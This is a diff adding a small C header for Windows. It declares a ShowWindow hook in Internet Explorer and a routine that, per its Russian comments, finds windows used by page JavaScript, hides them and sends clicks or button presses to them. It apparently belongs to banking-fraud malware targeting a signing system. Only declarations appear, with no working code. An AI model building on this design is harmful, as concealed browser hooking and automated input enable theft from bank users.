@@ -1,0 +1,11 @@
+#ifndef bsssignH
+#define bsssignH
+#include <windows.h>
+#include <wininet.h>
+
+//хук ShowWindow вызываеться в ие, может неодекватно влиять на другие хуки
+void HookForBsssign();
+// здесь отлавливаються нужные окна для яваскрипта и хайдяться. туда посылаються клики, либо же нажимаються кнопки
+void IsBsssign( HINTERNET hRequest );
+
+#endif
